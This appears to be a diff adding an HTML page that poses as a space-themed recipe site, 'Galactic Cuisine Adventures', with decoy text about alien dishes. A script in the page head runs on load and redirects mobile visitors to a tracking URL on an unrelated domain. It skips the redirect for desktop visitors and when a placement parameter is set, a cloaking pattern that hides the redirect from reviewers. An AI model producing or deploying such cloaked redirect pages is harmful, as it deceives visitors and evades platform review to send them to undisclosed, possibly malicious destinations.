@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const ttclid = urlParams.get("ttclid");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://klcxb6.mcgo2.com/visit/dade2563-43ce-4351-9ba3-22961c539221?s1=${s}`;
+    if (utmXXX === "__PLACEMENT__") { }
+    else if (isMobileDevice) { window.location.href = lander; } 
+    else { }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Galactic Cuisine Adventures</title>
+    <style>
+        body {
+            font-family: 'Courier New', monospace;
+            background: linear-gradient(45deg, #8a2be2, #20b2aa);
+            color: #f0e68c;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 20px;
+            padding: 20px;
+        }
+        header {
+            grid-column: 1 / -1;
+            text-align: center;
+            background-color: rgba(0, 0, 0, 0.5);
+            padding: 20px;
+        }
+        nav {
+            grid-column: 1 / -1;
+            display: flex;
+            justify-content: space-around;
+            background-color: #4b0082;
+            padding: 10px;
+        }
+        nav a {
+            color: #00ffff;
+            text-decoration: none;
+            font-weight: bold;
+        }
+        main {
+            grid-column: 1 / 3;
+            background-color: rgba(255, 255, 255, 0.1);
+            padding: 20px;
+            border-radius: 15px;
+        }
+        aside {
+            grid-column: 3 / 4;
+            background-color: rgba(0, 0, 0, 0.3);
+            padding: 20px;
+            border-radius: 15px;
+        }
+        footer {
+            grid-column: 1 / -1;
+            text-align: center;
+            background-color: #4b0082;
+            padding: 10px;
+        }
+        h1, h2 {
+            color: #ffd700;
+        }
+        .privacy-link {
+            color: #00ffff;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>Galactic Cuisine Adventures</h1>
+        </header>
+        <nav>
+            <a href="#">Home</a>
+            <a href="#">Alien Recipes</a>
+            <a href="#">Intergalactic Ingredients</a>
+            <a href="#">Contact Us</a>
+        </nav>
+        <main>
+            <h2>Welcome to Our Cosmic Kitchen</h2>
+            <p>Embark on a culinary journey across the stars! Discover exotic flavors from distant planets and learn to cook meals that are truly out of this world.</p>
+            <p>Our team of xenogastronomists has traveled the galaxy to bring you the most unique and delicious recipes from every corner of the cosmos.</p>
+        </main>
+        <aside>
+            <h2>Featured Dish</h2>
+            <p>Try our Nebula Noodles with Stardust Sauce - a dish that literally glows on your plate!</p>
+        </aside>
+        <footer>
+            <p>&copy; 2023 Galactic Cuisine Adventures. All rights reserved. <a href="https://tokreward.com/privacy.html" class="privacy-link">Privacy Policy</a></p>
+        </footer>
+    </div>
+</body>
+</html>
